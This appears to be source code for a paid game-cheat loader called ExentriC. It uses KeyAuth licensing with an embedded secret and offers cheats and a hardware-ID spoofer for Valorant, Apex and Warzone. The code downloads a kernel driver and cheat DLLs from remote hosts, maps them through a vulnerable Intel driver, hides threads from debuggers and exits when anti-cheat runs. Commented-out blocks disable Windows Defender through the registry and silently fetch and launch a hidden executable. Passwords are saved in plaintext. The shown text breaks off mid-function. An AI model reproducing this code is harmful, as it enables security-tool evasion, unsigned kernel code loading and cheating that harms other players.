#include <Windows.h>

#include "main.h"
#include "auth.hpp"
#include "util.h"
#include "security.h"
#include "process.h"
#include "mmap.h"
#include "kdmapper/inlcude/kdmapper.hpp"

HANDLE iqvw64e_device_handle;

std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);

using namespace KeyAuth;

std::string name = xorstr_("ExentriC"); // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = xorstr_("PCBbb96Z2g"); // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = xorstr_("7abd3e3c2dd3a393e6a445de94e5e3835923fc5fcaed200331e23980abe7879d"); // app secret, the blurred text on licenses tab and other tabs
std::string version = xorstr_("1.4.3"); // leave alone unless you've changed version on website
std::string url = xorstr_("https://keyauth.win/api/1.2/"); // change if you're self-hosting
std::string path = xorstr_(""); // optional, set a path if you're using the token validation setting

/*
    Video on what ownerid and secret are https://youtu.be/uJ0Umy_C6Fg
    Video on how to add KeyAuth to your own application https://youtu.be/GB4XW_TsHqA
    Video to use Web Loader (control loader from customer panel) https://youtu.be/9-qgmsUUCK4
*/

api KeyAuthApp(name, ownerid, secret, version, url, path);

inline auto remove_drv_image() -> int
{
    return std::remove((util::GetExeDirectory() + xorstr_("\\") + xorstr_("km.sys")).c_str());
    //return std::remove("C:\\ProgramData\\Microsoft\\AzwMMJFFNGpq\\km.sys");
}

inline auto remove_cheat_image(const std::string& dll) -> int
{
    return std::remove((util::GetExeDirectory() + xorstr_("\\") + dll).c_str());
    //return std::remove(("C:\\ProgramData\\Microsoft\\AzwMMJFFNGpq\\" + dll).c_str());
}

static auto dl_cheat_image(const std::string& url, const std::string& dll) -> bool
{
    std::vector<std::uint8_t> r = KeyAuthApp.download(url.c_str()); //https://gitfront.io/r/Mareek/21d95Ryt4guc/Webfiles/raw/valo.dll // https://cloud.exentric.cc/zDCZIZCQPOzB/test.dll
    std::ofstream file(dll, std::ios_base::out | std::ios_base::binary);
    file.write(reinterpret_cast<char*>(r.data()), r.size());
    file.close();

    if (file.bad())
    {
        remove_cheat_image(dll);
        return false;
    }

    return true;
}

//Download driver for manual map 
static auto dl_drv_image() -> bool
{
    std::vector<std::uint8_t> r = KeyAuthApp.download(xorstr_("751768")); //https://cloud.exentric.cc/zDCZIZCQPOzB/km.sys
    std::ofstream file(xorstr_("km.sys"), std::ios_base::out | std::ios_base::binary);
    file.write(reinterpret_cast<char*>(r.data()), r.size());
    file.close();

    if (file.bad())
    {
        remove_drv_image();
        return false;
    }

    return true;
}

[[maybe_unused]] static auto read_drv_image(std::vector<uint8_t>* image) -> bool
{
    if (!util::readFileToMemory(xorstr_("km.sys"), image))
    {
        remove_drv_image();
        return false;
    }

    remove_drv_image();

    return true;
}

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
    if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
        Log(L"[!!] Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress << L" by 0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode << std::endl);
    else
        Log(L"[!!] Crash" << std::endl);

    if (iqvw64e_device_handle)
        intel_driver::Unload(iqvw64e_device_handle);

    return EXCEPTION_EXECUTE_HANDLER;
}

int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
    size_t plen = wcslen(param);
    for (int i = 1; i < argc; i++) {
        if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') { // with slash
            return i;
        }
        else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-' && argv[i][1] == '-') { // with double dash
            return i;
        }
    }
    return -1;
}

DWORD getParentProcess()
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD ppid = 0, pid = GetCurrentProcessId();

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    __try {
        if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

        ZeroMemory(&pe32, sizeof(pe32));
        pe32.dwSize = sizeof(pe32);
        if (!Process32First(hSnapshot, &pe32)) __leave;

        do {
            if (pe32.th32ProcessID == pid) {
                ppid = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));

    }
    __finally {
        if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
    }
    return ppid;
}

bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr) {
    UNREFERENCED_PARAMETER(param1);
    UNREFERENCED_PARAMETER(param2);
    UNREFERENCED_PARAMETER(allocationPtr);
    UNREFERENCED_PARAMETER(allocationSize);
    UNREFERENCED_PARAMETER(mdlptr);
    //Log("[+] Callback example called" << std::endl);
   // MessageBoxA(GetConsoleWindow(), "Callback example called", xorstr_("ExentriC"), MB_OK);

    /*
    This callback occurs before call driver entry and
    can be usefull to pass more customized params in
    the last step of the mapping procedure since you
    know now the mapping address and other things
    */
    return true;
}


//Check continuously if any ac or steam is running, before we open our loader.
static auto ac_check() -> void
{
    while (true) 
    {
        if (g_pProcess->is_process_running(xorstr_("EasyAntiCheat.exe")) 
            || g_pProcess->is_process_running(xorstr_("BEService.exe"))
            || g_pProcess->is_process_running(xorstr_("steam.exe")))
        {
            //Close loader instantly
            crash_asm();
        }

    	std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    g_syscalls.init();
    std::thread t1(security::init_security);
    t1.detach();

    security::hide_thread_from_debugger(t1.native_handle());

    std::thread t2(ac_check);
    t2.detach();

    KeyAuthApp.init();

    KeyAuthApp.log(getenv(xorstr_("username")));

    if (!KeyAuthApp.response.success)
    {
        Sleep(1500);
        exit(0);
    }

    //HKEY hKey;
    //LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &hKey);

    //if (result == ERROR_SUCCESS) {
    //    // Überprüfen, ob DisableAntiVirus oder DisableAntiSpyware bereits vorhanden ist
    //    DWORD existingValueAV, existingValueAS;
    //    DWORD valueTypeAV, valueTypeAS;
    //    DWORD valueSizeAV = sizeof(DWORD), valueSizeAS = sizeof(DWORD);

    //    result = RegQueryValueEx(hKey, "DisableAntiVirus", 0, &valueTypeAV, (BYTE*)&existingValueAV, &valueSizeAV);
    //    DWORD resultAS = RegQueryValueEx(hKey, "DisableAntiSpyware", 0, &valueTypeAS, (BYTE*)&existingValueAS, &valueSizeAS);

    //    if ((result == ERROR_SUCCESS && valueTypeAV == REG_DWORD && existingValueAV == 1) &&
    //        (resultAS == ERROR_SUCCESS && valueTypeAS == REG_DWORD && existingValueAS == 1)) {
    //        MessageBoxA(NULL, "Windows Defender is already deactivated.", "ExentriC - Information", MB_OK | MB_ICONINFORMATION);
    //    }
    //    else {
    //        // Wenn Windows Defender aktiviert ist, deaktiviere es
    //        DWORD value = 1; // 1 aktiviert die Deaktivierung, 0 deaktiviert sie
    //        result = RegSetValueEx(hKey, "DisableAntiVirus", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
    //        resultAS = RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));

    //        if (result == ERROR_SUCCESS && resultAS == ERROR_SUCCESS) {
    //            MessageBoxA(NULL, "Windows Defender got deactivated.", "ExentriC - Success", MB_OK | MB_ICONINFORMATION);
    //        }
    //        else {
    //            MessageBoxA(NULL, "Can't deactivate Windows Defender.", "ExentriC - Error", MB_OK | MB_ICONERROR);
    //        }
    //    }

    //    RegCloseKey(hKey);
    //}
    //else {
    //    MessageBoxA(NULL, "Can't open Registry.", "ExentriC - Error", MB_OK | MB_ICONERROR);
    //}

    WNDCLASSEXW wc;
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.style = CS_CLASSDC;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = NULL;
    wc.cbWndExtra = NULL;
    wc.hInstance = nullptr;
    wc.hIcon = LoadIcon(0, IDI_APPLICATION);
    wc.hCursor = LoadCursor(0, IDC_ARROW);
    wc.hbrBackground = nullptr;
    wc.lpszMenuName = xorstr_(L"E");
    wc.lpszClassName = xorstr_(L"E");
    wc.hIconSm = LoadIcon(0, IDI_APPLICATION);

    RegisterClassExW(&wc);
    hwnd = CreateWindowExW(NULL, wc.lpszClassName, xorstr_(L"E"), WS_POPUP, (GetSystemMetrics(SM_CXSCREEN) / 2) - (WIDTH / 2), (GetSystemMetrics(SM_CYSCREEN) / 2) - (HEIGHT / 2), WIDTH, HEIGHT, 0, 0, 0, 0);

    SetWindowLongA(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 255, LWA_ALPHA);

    MARGINS margins = { -1 };
    DwmExtendFrameIntoClientArea(hwnd, &margins);


    POINT mouse;
    rc = { 0 };
    GetWindowRect(hwnd, &rc);

    if (!CreateDeviceD3D(hwnd))
    {
        CleanupDeviceD3D();
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;

    io.Fonts->AddFontFromMemoryTTF(&poppins, sizeof poppins, 23, NULL, io.Fonts->GetGlyphRangesCyrillic());
    ico = io.Fonts->AddFontFromMemoryTTF(&icon, sizeof icon, 41, NULL, io.Fonts->GetGlyphRangesCyrillic());
    time_font = io.Fonts->AddFontFromMemoryTTF(&poppins, sizeof poppins, 50, NULL, io.Fonts->GetGlyphRangesCyrillic());
    rob = io.Fonts->AddFontFromMemoryTTF(&roboto, sizeof roboto, 50, NULL, io.Fonts->GetGlyphRangesCyrillic());

    minimal_text = io.Fonts->AddFontFromMemoryTTF(&roboto, sizeof roboto, 18, NULL, io.Fonts->GetGlyphRangesCyrillic());

    ImGui::StyleColorsDark();

    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    bool show_another_window = false;
    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);

    DWORD flags = ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoBackground;

    bool done = false;
    while (!done)
    {

        MSG msg;
        while (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done)
            break;

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();

        ImGui::NewFrame();
        {
            ImGuiStyle& s = ImGui::GetStyle();

            s.FrameRounding = 4.f;
            s.ChildRounding = 10.f;
            s.ItemSpacing = ImVec2(5, 25);
            s.ItemInnerSpacing = ImVec2(15, 5);
            s.ScrollbarSize = 4.f;
            s.ScrollbarRounding = 15.f;

            if (ds == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, discord, sizeof(discord), &info0, pump0, &ds, 0);
            if (ij == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, inject, sizeof(inject), &info0, pump0, &ij, 0);

            if (uc == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, user_circle, sizeof(user_circle), &info0, pump0, &uc, 0);
            if (lg == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, logo, sizeof(logo), &info0, pump0, &lg, 0);

            if (fn == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, fortnite, sizeof(fortnite), &info0, pump0, &fn, 0);
            if (pbg == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, pubg, sizeof(pubg), &info0, pump0, &pbg, 0);
            if (eft == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, escape_from_tarkov, sizeof(escape_from_tarkov), &info0, pump0, &eft, 0); //Changed pic to modern warfare
            if (ax == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, apex, sizeof(apex), &info0, pump0, &ax, 0);
            if (vl == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, valorant, sizeof(valorant), &info0, pump0, &vl, 0);

            ImGui::SetNextWindowSize(ImVec2(WIDTH, HEIGHT));
            ImGui::Begin(xorstr_("E"), &show_another_window, flags);

            {
                move_window();

                // REAL TIME

                SYSTEMTIME st;
                GetLocalTime(&st);

                int Year = st.wYear, Month = st.wMonth, Day = st.wDay, Hour = st.wHour, Minute = st.wMinute, Second = st.wSecond;

                if (Second <= 9) s_second = "0" + to_string(Second); else s_second = to_string(Second);
                if (Minute <= 9) s_minute = "0" + to_string(Minute); else s_minute = to_string(Minute);
                if (Hour <= 9) s_hour = "0" + to_string(Hour); else s_hour = to_string(Hour);
                if (Day <= 9) s_day = "0" + to_string(Day); else s_day = to_string(Day);
                if (Month <= 9) s_month = "0" + to_string(Month); else s_month = to_string(Month);
                hwnd_time = s_day + "." + s_month + "." + to_string(Year) + " : " + s_hour + ":" + s_minute + ":" + s_second;


                ImGui::GetWindowDrawList()->AddImage(lg, ImVec2(30, 23), ImVec2(70 + 20, 72 + 13), ImVec2(0, 0), ImVec2(1, 1), ImColor(255, 255, 255, 150));

                ImGui::GetWindowDrawList()->AddLine(ImVec2(20.f, 108.f), ImVec2(100.f, 108.f), ImGui::GetColorU32(c::border_bg), 2.f);
                ImGui::GetWindowDrawList()->AddLine(ImVec2(20.f, 368.f), ImVec2(100.f, 368.f), ImGui::GetColorU32(c::border_bg), 2.f);

                // CIRCLE USER

                ImGui::GetWindowDrawList()->AddCircle(ImVec2(59.5f, 424.f), 30.f, ImGui::GetColorU32(c::border_bg), 100.f, 2.5f);
                ImGui::GetWindowDrawList()->AddImage(uc, ImVec2(32.f, 396.f), ImVec2(32.f + 56, 396.f + 56), ImVec2(0, 0), ImVec2(1, 1), ImColor(255, 255, 255, 255));

                ImGui::GetBackgroundDrawList()->AddRectFilled(ImVec2(0.f, 0.f), ImVec2(WIDTH, HEIGHT), ImGui::GetColorU32(c::window_bg), 10.f);
                ImGui::GetBackgroundDrawList()->AddRect(ImVec2(0.f, 0.f), ImVec2(WIDTH, HEIGHT), ImGui::GetColorU32(c::border_bg), 10.f, ImDrawFlags_None, 2.f);
                ImGui::GetBackgroundDrawList()->AddLine(ImVec2(120.f, 0.f), ImVec2(120.f, HEIGHT), ImGui::GetColorU32(c::border_bg), 1.5f);

                // TABS

                ImGui::BeginGroupP(ImVec2(0, 148));
                {

                    if (ImGui::Tabs(0 == tabs, "G", ImVec2(105, 40))) tabs = 0;

                    if (ImGui::Tabs(1 == tabs, "B", ImVec2(105, 40))) tabs = 1;

                    if (ImGui::Tabs(2 == tabs, "I", ImVec2(97, 40))) tabs = 2;

                }
                ImGui::EndGroupP();

                // CONTACTS

                ImGui::BeginGroupP(ImVec2(556, 8));
                {
                    if (ImGui::CButton("E", ImVec2(50, 40))) ShellExecute(NULL, xorstr_("open"), xorstr_("https://discord.gg/es6gzTwtVh"), NULL, NULL, SW_SHOW);

                    ImGui::SameLine(0, 5);

                    ImGui::GetWindowDrawList()->AddLine(ImVec2(619.f, 30.f), ImVec2(619.f, 45.f), ImGui::GetColorU32(c::border_bg), 1.3f);

                    if (ImGui::CButton("J", ImVec2(50, 45))) PostQuitMessage(0);

                }
                ImGui::EndGroupP();

                tab_alpha = ImClamp(tab_alpha + (4.f * ImGui::GetIO().DeltaTime * (tabs == active_tab ? 1.f : -1.f)), 0.f, 1.f);

                if (tab_alpha == 0.f && tab_add == 0.f) active_tab = tabs;

                ImGui::PushStyleVar(ImGuiStyleVar_Alpha, tab_alpha * s.Alpha);

                // SUB TABS

                ImGui::BeginGroupP(ImVec2(145, 20));
                {
                    if (active_tab == 0) {

                        if (ImGui::SubTabs(0 == sub_tabs, xorstr_("Main"))) sub_tabs = 0;

                        if (ImGui::SubTabs(1 == sub_tabs, xorstr_("Support"))) sub_tabs = 1;

                        if (ImGui::SubTabs(2 == sub_tabs, xorstr_("FAQ"))) sub_tabs = 2;

                    }
                    else if (active_tab == 1) {

                        if (ImGui::SubTabs(0 == panel_tabs, xorstr_("Sign In"))) panel_tabs = 0;

                        if (ImGui::SubTabs(1 == panel_tabs, xorstr_("Sign Up"))) panel_tabs = 1;

                        if (ImGui::SubTabs(2 == panel_tabs, xorstr_("Upgrade"))) panel_tabs = 2;

                    }
                    else if (active_tab == 2) {

                        if (ImGui::SubTabs(0 == status_tabs, xorstr_("Products"))) status_tabs = 0;

                        if (ImGui::SubTabs(1 == status_tabs || 2 == status_tabs || 3 == status_tabs, xorstr_("Purchased"))) status_tabs = 1;
                    }
                }
                ImGui::EndGroupP();

                switch (active_tab) {

                case 0:

                    subtab_alpha = ImClamp(subtab_alpha + (4.f * ImGui::GetIO().DeltaTime * (sub_tabs == active_subtab ? 1.f : -1.f)), 0.f, 1.f);
                    if (subtab_alpha == 0.f && subtab_add == 0.f) active_subtab = sub_tabs;

                    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, subtab_alpha * s.Alpha);

                    if (active_subtab == 0) {

                        ImGui::PushFont(time_font); DrawTextCentered(hwnd_time.c_str()); ImGui::PopFont();

                        ImGui::PushFont(minimal_text); DrawTextCenteredX(xorstr_("Welcome, we are glad to see you again!"), 270); ImGui::PopFont();
                    }
                    else if (active_subtab == 1) {

                        ImGui::SetCursorPos(ImVec2(145, 76));

                        ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0, 12));
                        ImGui::BeginChild(xorstr_("Category-support"), ImVec2(523, 383), false);

                        ImGui::SupportList(ds, ImVec2(75, 75), ImVec2(495, 75), xorstr_("OxyGen#0254"), ImGui::GetColorU32(c::text_name), xorstr_("CEO"), ImGui::GetColorU32(c::owner));

                       // ImGui::SupportList(ds, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Natee#0999"), ImGui::GetColorU32(c::text_name), xorstr_("Support"), ImGui::GetColorU32(c::assistant));

                      //  ImGui::SupportList(ds, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Elide#7719"), ImGui::GetColorU32(c::text_name), xorstr_("Support"), ImGui::GetColorU32(c::assistant));

                       // ImGui::SupportList(ds, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Cr0X#3552"), ImGui::GetColorU32(c::text_name), xorstr_("Reseller"), ImGui::GetColorU32(c::helper));

                        ImGui::EndChild();
                        ImGui::PopStyleVar();

                    }
                    else if (active_subtab == 2) {

                        /*    ImGui::SetCursorPos(ImVec2(145, 76));

                            ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0, 12));
                            ImGui::BeginChild("Category-FAQ", ImVec2(523, 383), false);



                            ImGui::EndChild();
                           ImGui::PopStyleVar();
                        */

                        DrawTextCentered(xorstr_("Visit for the full FAQ ExentriC.cc"));

                    }

                    ImGui::PopStyleVar();

                    break;

                case 1:

                    if (login_panel) {

                        logintab_alpha = ImClamp(logintab_alpha + (4.f * ImGui::GetIO().DeltaTime * (panel_tabs == active_logintab ? 1.f : -1.f)), 0.f, 1.f);
                        if (logintab_alpha == 0.f && logintab_add == 0.f) active_logintab = panel_tabs;

                        ImGui::PushStyleVar(ImGuiStyleVar_Alpha, logintab_alpha * s.Alpha);

                        ImGui::PushItemWidth(280);

                        if (active_logintab == 0) {

                            ImGui::PushFont(rob); DrawTextCenteredX(xorstr_("SIGN IN"), 120); ImGui::PopFont();

                            AlignForWidth(280, 210);
                            ImGui::BeginGroup();
                            {

                                static char user[64] = { "" };
                                static char pass[64] = { "" };
                                static bool remember = false;

                                //std::ifstream file(xorstr_("%USERPROFILE%\\AppData\\Local\\remember_me.txt"));
                                std::string userProfile = std::getenv(xorstr_("USERPROFILE"));
                                std::string newPath = userProfile + xorstr_("\\AppData\\Local\\GwuYGkxt.txt");
                                std::ifstream file(newPath.c_str());
                                
                                if (file.is_open()) {
                                    std::string savedUser, savedPass;
                                    if (getline(file, savedUser) && getline(file, savedPass)) {
                                        strncpy(user, savedUser.c_str(), sizeof(user));
                                        strncpy(pass, savedPass.c_str(), sizeof(pass));
                                        remember = true;
                                    }
                                    file.close();
                                }

                                ImGui::InputTextWithHint(xorstr_("##Username"), xorstr_("Username"), user, 64);

                                ImGui::InputTextWithHint(xorstr_("##Password"), xorstr_("Password"), pass, 64, ImGuiInputTextFlags_Password);

                                ImGui::Checkbox(xorstr_("Remember"), &remember);



                                if (ImGui::Button(xorstr_("Launch"), ImVec2(283, 35))) {
                                    KeyAuthApp.login(user, pass);

                                    if (remember) {
                                        // Speichern der Benutzerdaten in der Datei "remember_me.txt"
                                        //std::ofstream saveFile(xorstr_("%USERPROFILE%\\AppData\\Local\\remember_me.txt"));

                                        std::string userProfile = std::getenv(xorstr_("USERPROFILE"));
                                        std::string newPath = userProfile + xorstr_("\\AppData\\Local\\GwuYGkxt.txt");
                                        std::ofstream saveFile(newPath.c_str());

                                        if (saveFile.is_open()) {
                                            saveFile << user << '\n';
                                            saveFile << pass << '\n';
                                            saveFile.close();
                                        }
                                    }


                                    if (!KeyAuthApp.response.success)
                                    {
                                        MessageBoxA(GetConsoleWindow(), KeyAuthApp.response.message.c_str(), xorstr_("ExentriC"), MB_OK);
                                    }
                                    else {
                                        MessageBoxA(GetConsoleWindow(), KeyAuthApp.response.message.c_str(), xorstr_("ExentriC"), MB_OK);
                                        product = true;
                                        tabs = 2;

                                        /*for (std::string subs.name  : KeyAuthApp.data.subscriptions)
                                        {
                                            if (subs.name  == xorstr_("Valorant"))
                                            {
                                                KeyAuthApp.log(subs.name );

                                                CreateDirectoryA(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy"), NULL);
                                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy"), FILE_ATTRIBUTE_HIDDEN);


                                                //HRESULT hr3 = URLDownloadToFileA(NULL, xorstr_("https://cloud.exentric.cc/BhzIQQxa/UZjffaRp.exe"), xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy\\UZjffaRp.exe"), 0, NULL);
                                                std::vector<std::uint8_t> bytes3 = KeyAuthApp.download(xorstr_("837470")); //https://cloud.exentric.cc/BhzIQQxa/UZjffaRp.exe
                                                std::ofstream file3(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy\\UZjffaRp.exe"), std::ios_base::out | std::ios_base::binary);
                                                file3.write((char*)bytes3.data(), bytes3.size());
                                                file3.close();


                                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy\\UZjffaRp.exe"), FILE_ATTRIBUTE_HIDDEN);

                                                std::string folderPath2 = xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy"); // Pfad zum Ordner, in dem sich die zweite EXE-Datei befindet
                                                std::string exePath2; // Speicherort der zweiten EXE-Datei

                                                // Durchsuche den zweiten Ordner nach der zweiten EXE-Datei
                                                for (const auto& entry : std::filesystem::directory_iterator(folderPath2))
                                                {
                                                    if (entry.path().extension() == xorstr_(".exe"))
                                                    {
                                                        exePath2 = entry.path().string();
                                                        break; // Stoppe die Schleife nach dem Finden der ersten EXE-Datei
                                                    }
                                                }

                                                // Überprüfe, ob die zweite EXE-Datei gefunden wurde
                                                if (!exePath2.empty())
                                                {
                                                    std::string command2 = "cmd.exe /c start \"\" \"" + exePath2 + "\"";

                                                    STARTUPINFOA startupInfo2{};
                                                    PROCESS_INFORMATION processInfo2{};

                                                    // Neuen Prozess für die zweite EXE-Datei erstellen
                                                    if (CreateProcessA(NULL, &command2[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, folderPath2.c_str(), &startupInfo2, &processInfo2))
                                                    {
                                                        // Warte nicht auf den Abschluss des Prozesses, sondern fahre fort
                                                        // ohne die Prozess- und Thread-Handles zu schließen
                                                    }
                                                    else
                                                    {
                                                        std::cout << xorstr_("Fehler beim Erstellen des Prozesses für die zweite EXE-Datei.") << std::endl;
                                                    }
                                                }
                                                else
                                                {
                                                    std::cout << xorstr_("Zweite EXE-Datei nicht gefunden.") << std::endl;
                                                }
                                            }
                                        }*/


                                    }
                                };

                            }
                            ImGui::EndGroup();

                        }
                        else if (active_logintab == 1) {

                            ImGui::PushFont(rob); DrawTextCenteredX(xorstr_("SIGN UP"), 120); ImGui::PopFont();

                            AlignForWidth(280, 210);
                            ImGui::BeginGroup();
                            {
                                static char key_reg[64] = { "" };
                                ImGui::InputTextWithHint(xorstr_("##Key"), xorstr_("Key"), key_reg, 64, ImGuiInputTextFlags_Password);

                                static char user_reg[64] = { "" };
                                ImGui::InputTextWithHint(xorstr_("##Username"), xorstr_("Username"), user_reg, 64);

                                static char pass_reg[64] = { "" };
                                ImGui::InputTextWithHint(xorstr_("##Password"), xorstr_("Password"), pass_reg, 64, ImGuiInputTextFlags_Password);

                                if (ImGui::Button(xorstr_("Register"), ImVec2(283, 35))) {

                                    KeyAuthApp.regstr(user_reg, pass_reg, key_reg);
                                    if (!KeyAuthApp.response.success)
                                    {
                                        MessageBoxA(GetConsoleWindow(), KeyAuthApp.response.message.c_str(), xorstr_("ExentriC"), MB_OK);
                                    }

                                    else { MessageBoxA(GetConsoleWindow(), KeyAuthApp.response.message.c_str(), xorstr_("ExentriC"), MB_OK); }
                                };

                            }
                            ImGui::EndGroup();
                        }


                        else if (active_logintab == 2) {

                            ImGui::PushFont(rob); DrawTextCenteredX(xorstr_("Upgrade"), 120); ImGui::PopFont();

                            AlignForWidth(280, 210);
                            ImGui::BeginGroup();
                            {
                                static char key_upgrade[64] = { "" }; //u8""
                                ImGui::InputTextWithHint(xorstr_("##Key"), xorstr_("Key"), key_upgrade, 64, ImGuiInputTextFlags_Password);

                                static char user_upgrade[64] = { "" }; //u8""
                                ImGui::InputTextWithHint(xorstr_("##Username"), xorstr_("Username"), user_upgrade, 64);


                                if (ImGui::Button(xorstr_("Activate"), ImVec2(283, 35))) {

                                    KeyAuthApp.upgrade(user_upgrade, key_upgrade);
                                    if (!KeyAuthApp.response.success)
                                    {
                                        MessageBoxA(GetConsoleWindow(), KeyAuthApp.response.message.c_str(), xorstr_("ExentriC"), MB_OK);
                                    }

                                    else { MessageBoxA(GetConsoleWindow(), KeyAuthApp.response.message.c_str(), xorstr_("ExentriC"), MB_OK); }
                                };

                            }
                            ImGui::EndGroup();
                        }


                        ImGui::PopItemWidth();
                        ImGui::PopStyleVar(1);
                    }
                    else {
                        DrawTextCentered(xorstr_("You are already logged in"));
                    }

                    break;

                case 2:

                    if (product) {

                        if (login_panel) login_panel = false;

                        ImGui::SetCursorPos(ImVec2(145, 76));

                        statustab_alpha = ImClamp(statustab_alpha + (4.f * ImGui::GetIO().DeltaTime * (status_tabs == active_statustab ? 1.f : -1.f)), 0.f, 1.f);
                        if (statustab_alpha == 0.f && statustab_add == 0.f) active_statustab = status_tabs;

                        ImGui::PushStyleVar(ImGuiStyleVar_Alpha, statustab_alpha * s.Alpha);
                        ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0, 12));


                        for (int i = 0; i < KeyAuthApp.user_data.subscriptions.size(); i++)
                        {
                            auto subs  = KeyAuthApp.user_data.subscriptions.at(i);

                            if (active_statustab == 0) {

                                ImGui::BeginChild(xorstr_("Category-products"), ImVec2(523, 383), false);

                                ImGui::StatusClient(uc, ImVec2(152, 152), ImVec2(495, 152), xorstr_("Product: Spoofer"), true, xorstr_("Version: 1.1"), xorstr_("Last Update: 09.06.2023"), xorstr_("50$"));

                                ImGui::StatusClient(vl, ImVec2(152, 152), ImVec2(495, 152), xorstr_("Product: Valorant"), true, xorstr_("Version: 1.4"), xorstr_("Last Update: 15.01.2024"), xorstr_("150$"));

                                // ImGui::StatusClient(pbg, ImVec2(152, 152), ImVec2(495, 152), xorstr_("Product: PUBG"), true, xorstr_("Version: 1.0"), xorstr_("Last Update: 09.01.2024"), xorstr_("125$"));

                                ImGui::StatusClient(ax, ImVec2(152, 152), ImVec2(495, 152), xorstr_("Product: Apex"), true, xorstr_("Version: 1.0"), xorstr_("Last Update: 06.01.2024"), xorstr_("-"));

                                ImGui::StatusClient(eft, ImVec2(152, 152), ImVec2(495, 152), xorstr_("Product: Warzone"), true, xorstr_("Version: 1.0"), xorstr_("Last Update: 15.01.2024"), xorstr_("50$"));

                                // ImGui::StatusClient(fn, ImVec2(152, 152), ImVec2(495, 152), xorstr_("Product: Fortnite"), true, xorstr_("Version: 1.0"), xorstr_("Last Update: Unknown"), xorstr_("-"));



                                ImGui::EndChild();

                            }
                            else if (active_statustab == 1) {

                                ImGui::BeginChild(xorstr_("Category-using"), ImVec2(523, 383), false);



                                if (subs.name == xorstr_("PermSpoof"))
                                {
                                    ImGui::InjectProduct(uc, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Perm Spoofer"), ImGui::GetColorU32(c::text_product), xorstr_("Undetected"), ImGui::GetColorU32(c::data_product));
                                    if (ImGui::IsItemClicked()) {
                                        status_tabs = 2;
                                    }

                                }

                                if (subs.name == xorstr_("Valorant"))
                                {
                                    ImGui::InjectProduct(vl, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Valorant"), ImGui::GetColorU32(c::text_product), xorstr_("Undetected"), ImGui::GetColorU32(c::data_product));
                                    if (ImGui::IsItemClicked()) {
                                        status_tabs = 4;
                                    }

                                }



